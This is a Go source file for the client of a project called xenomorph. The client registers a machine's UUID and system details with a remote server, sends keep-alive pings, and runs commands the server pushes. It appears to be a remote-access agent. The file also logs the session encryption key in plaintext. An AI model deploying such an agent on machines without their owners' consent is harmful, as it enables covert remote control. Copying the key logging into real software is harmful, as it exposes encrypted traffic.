package client

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/codevault-llc/xenomorph/internal/client/command"
	"github.com/codevault-llc/xenomorph/internal/client/services/system"
	"github.com/codevault-llc/xenomorph/internal/secure"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"github.com/codevault-llc/xenomorph/pkg/utils"
	"go.uber.org/zap"
)

type Client struct {
	Address   string
	Conn      net.Conn
	Sec       *secure.Sec
	Handler   command.CommandHandler
	KeepAlive chan struct{}
}

// NewClient creates a new Client instance with the specified address.
// It initializes the command handler and the secure connection manager.
func NewClient(addr string) *Client {
	handler := command.NewHandler()

	return &Client{
		Address:   addr,
		Sec:       secure.New(),
		Handler:   handler,
		KeepAlive: make(chan struct{}),
	}
}

// Connect establishes a TCP connection to the server at the specified address.
// It returns an error if the connection fails.
func (c *Client) Connect() error {
	conn, err := net.Dial("tcp", c.Address)
	if err != nil {
		return fmt.Errorf("connect error: %w", err)
	}
	c.Conn = conn
	return nil
}

// Run starts the client, connects to the server, and listens for incoming messages.
// It sends a connection message with the system UUID and system info.
// It also starts a keep-alive routine that sends a ping message every 30 seconds.
// If an error occurs during connection or message parsing, it logs the error and continues.
func (c *Client) Run() error {
	defer c.Close()

	if err := c.Connect(); err != nil {
		logger.L().Error("Failed to connect to server", zap.Error(err))
		return err
	}

	logger.L().Info("Connected to server", zap.String("address", c.Address))

	c.Send(types.MsgConnect, 0, 0, []byte(system.GetUUID()))
	c.ExpectAckOrHandshake()

	go c.keepAlive()

	
	info := system.Info()
	infoBytes, err := json.Marshal(info)
	if err != nil {
		logger.L().Error("Failed to marshal registration info", zap.Error(err))
		return err
	}

	c.Send(types.MsgRegistration, 0, 0, infoBytes)

	command.InitCommands()

	for {
		msgType, _, msgID, payload, err := c.Read()
		if err != nil {
			logger.L().Error("Failed to read message", zap.Error(err))
			continue
		}

		if msgType == types.MsgPing {
			logger.L().Debug("Received ping message")
			continue
		}

		if msgType == types.MsgCommand {
			c.Handler.Handle(c.Conn, msgID, payload)
		}
	}
}

// Send sends a message to the server with the specified type, flags, message ID, and payload.
// If the payload is encrypted, it encrypts the payload using the secure connection manager.
// If the flags indicate that the payload should be compressed, it compresses the payload before sending
func (c *Client) Send(msgType byte, flags byte, msgID uint32, payload []byte) {
	// encrypt the payload
	if c.Sec != nil {
		var err error
		payload, err = c.Sec.Encrypt(payload)
		if err != nil {
			logger.L().Error("Failed to encrypt payload", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
			return
		}
	}
	
	if flags&0x1 != 0 { // compression flag
		payload = utils.Compress(payload)
	}

	totalLen := 10 + len(payload) // 4+1+1+4 = 10 header bytes
	header := make([]byte, 10)
	binary.BigEndian.PutUint32(header[0:], uint32(totalLen))
	header[4] = msgType
	header[5] = flags
	binary.BigEndian.PutUint32(header[6:], msgID)

	if c.Conn == nil {
		logger.L().Error("Connection is nil, cannot send message", zap.String("type", fmt.Sprintf("%d", msgType)))
		return
	}

	_, err := c.Conn.Write(header)
	if err != nil {
		logger.L().Error("Failed to send message header", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
		return
	}

	_, err = c.Conn.Write(payload)
	if err != nil {
		logger.L().Error("Failed to send message payload", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
		return
	}
}

// Read reads a message from the server connection.
// It reads the message header to extract the total length, message type, flags, and message ID.
// It then reads the payload based on the total length minus the header size.
// If the flags indicate that the payload is compressed, it decompresses the payload.
// If the secure connection manager is set, it decrypts the payload.
func (c *Client) Read() (msgType byte, flags byte, msgID uint32, payload []byte, err error) {
	header := make([]byte, 10)
	if _, err = c.Conn.Read(header); err != nil {
		return
	}

	totalLen := binary.BigEndian.Uint32(header[0:])
	msgType = header[4]
	flags = header[5]
	msgID = binary.BigEndian.Uint32(header[6:])

	payload = make([]byte, totalLen-10)
	if _, err = c.Conn.Read(payload); err != nil {
		return
	}

	if flags&0x1 != 0 { // compression flag
		payload, err = utils.Decompress(payload)
		if err != nil {
			logger.L().Error("Failed to decompress payload", zap.Error(err), zap.ByteString("payload", payload))
			return
		}
	}

	if c.Sec != nil {
		payload, err = c.Sec.Decrypt(payload)
		if err != nil {
			logger.L().Error("Failed to decrypt payload", zap.Error(err), zap.ByteString("payload", payload))
			return
		}
	}

	return
}

// ExpectAck waits for an acknowledgment message from the server.
func (c *Client) ExpectAck() (bool, error) {
	for {
		msgType, _, _, payload, err := c.Read()
		if err != nil {
			logger.L().Error("Failed to read acknowledgment message", zap.Error(err))
			return false, err
		}

		if msgType == types.MsgAck {
			logger.L().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
			return true, nil
		} else {
			logger.L().Warn("Expected MsgAck but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
			return false, fmt.Errorf("expected MsgAck but received %d", msgType)
		}
	}
}

// ExpectAckOrHandshake waits for either an acknowledgment or a handshake message from the server.
func (c *Client) ExpectAckOrHandshake() (bool, error) {
	for {
		msgType, _, _, payload, err := c.Read()
		if err != nil {
			logger.L().Error("Failed to read acknowledgment or handshake message", zap.Error(err))
			return false, err
		}

		switch msgType {
			case types.MsgAck:
				logger.L().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
				return true, nil
			case types.MsgHandshake:
				var handshake types.HandshakePayload

				if err := json.Unmarshal(payload, &handshake); err != nil {
					logger.L().Error("Failed to unmarshal handshake payload", zap.Error(err), zap.ByteString("payload", payload))
					return false, err
				}

				if handshake.Encryption == "aes-gcm" {
					if err := c.Sec.InitFromRawKey(handshake.Key); err != nil {
						logger.L().Error("Failed to initialize secure connection with provided key", zap.Error(err), zap.ByteString("key", handshake.Key))
						return false, err
					} else {
						logger.L().Info("Secure connection established with AES-GCM encryption", zap.ByteString("key", handshake.Key))
					}
				}

				return true, nil
			default:
				logger.L().Warn("Expected MsgAck or MsgHandshake but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
				return false, fmt.Errorf("expected MsgAck or MsgHandshake but received %d", msgType)
		}
	}
}

// keepAlive sends a ping message every 30 seconds to keep the connection alive.
// It listens for a signal on the KeepAlive channel to stop the routine.
func (c *Client) keepAlive() {
	ticker := time.NewTicker(30 * time.Second)
	for {
		select {
		case <-ticker.C:
			c.Send(types.MsgPing, 0, 0, []byte{})
			logger.L().Debug("Sent keep-alive ping")
		case <-c.KeepAlive:
			ticker.Stop()
			return
		}
	}
}

// Close closes the client connection and stops the keep-alive routine.
// It should be called when the client is no longer needed.
func (c *Client) Close() {
	if c.Conn != nil {
		c.Conn.Close()
	}
	close(c.KeepAlive)
}
